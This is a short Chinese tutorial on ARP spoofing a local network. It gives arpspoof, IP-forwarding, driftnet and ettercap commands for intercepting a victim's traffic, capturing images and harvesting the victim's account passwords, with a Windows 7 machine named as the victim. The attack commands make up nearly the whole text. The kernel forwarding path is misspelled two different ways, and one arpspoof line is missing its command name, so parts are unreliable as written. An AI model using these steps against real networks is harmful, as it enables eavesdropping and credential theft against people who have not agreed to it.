# 内网ARP欺骗
---


1、

互相ping，

2、

arp -a  看到ARP缓存表中有对应的记录。

3、

apt install dsniff ssldump

arpspoof进行流量劫持  arpspoof -i eth0 -t 目标IP 目标网关IP

4、

设置端口转发，监听对方流量并嗅探图片

echo 1 > /proc/sys/net/ipv4/ip_forwardd

driftnet -i eth0


---

echo 1 > /proc/sys/net/ipv4/ip_foward //开启ip转发

开启了ip转发，进行ARP欺骗，受害者计算机将不会断网，获取到受害者电脑的相关账号密码。

eth0 -t 192.168.0.100 -r 192.168.0.1，-t后面接目标电脑，-r可以省略，后面接网关ip地址，这里我们使用一台Windows7充当受害者，其他电脑同理。

另一个终端ettercap -Tq  -i eth0 回车，-Tq表示在文本模式下静默启动，-i后面表示监听的网卡。
